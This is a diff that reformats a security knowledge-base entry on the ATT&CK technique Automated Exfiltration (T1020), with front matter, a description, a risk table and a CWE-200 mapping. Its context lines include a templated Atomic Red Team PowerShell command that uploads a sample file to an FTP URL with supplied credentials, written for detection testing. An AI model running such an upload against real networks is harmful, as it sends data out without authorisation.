@@ -32,8 +32,7 @@ cwe_ids:
   - CWE-200
 chains_with:
   - T1020.001
-prerequisites:
-  []
+prerequisites: []
 severity_boost:
   T1020.001: "Chain with T1020.001 for deeper attack path"
 ---
@@ -42,7 +41,7 @@ severity_boost:
 
 ## High-Level Description
 
-Adversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection. 
+Adversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection.
 
 When automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as Exfiltration Over C2 Channel and Exfiltration Over Alternative Protocol.
 
@@ -96,7 +95,6 @@ $creds = Get-Credential -Credential "#{credentials}"
 Invoke-WebRequest -Uri $ftpUrl -Method Put -InFile "#{sampleFile}" -Credential $creds
 ```
 
-
 ### Manual Testing
 
 If Atomic Red Team tests are not applicable, manually verify the technique by:
@@ -115,19 +113,17 @@ No specific mitigations documented for this technique.
 
 ### Automated Exfiltration Detection Strategy
 
-
 ## Risk Assessment
 
-| Finding | Severity | Impact |
-| ------- | -------- | ------ |
-| Automated Exfiltration technique applicable | Low | Exfiltration |
+| Finding                                     | Severity | Impact       |
+| ------------------------------------------- | -------- | ------------ |
+| Automated Exfiltration technique applicable | Low      | Exfiltration |
 
 ## CWE Categories
 
-| CWE ID | Title |
-| ------ | ----- |
+| CWE ID  | Title                             |
+| ------- | --------------------------------- |
 | CWE-200 | Exposure of Sensitive Information |
-
 
 ## References
 
